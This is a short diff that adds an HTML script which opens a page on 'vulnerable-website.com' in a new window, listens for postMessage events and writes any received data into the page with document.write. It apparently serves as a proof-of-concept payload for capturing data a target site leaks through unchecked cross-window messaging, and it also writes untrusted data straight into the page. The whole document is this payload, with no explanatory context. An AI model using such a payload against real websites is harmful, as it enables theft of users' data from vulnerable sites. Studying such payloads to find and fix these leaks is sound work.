@@ -1,0 +1,7 @@
+<script>
+  window.addEventListener("message", print)
+  function print(event){
+    document.write(JSON.stringify(event.data))
+  }
+  window.open("https://vulnerable-website.com/example")
+</script>
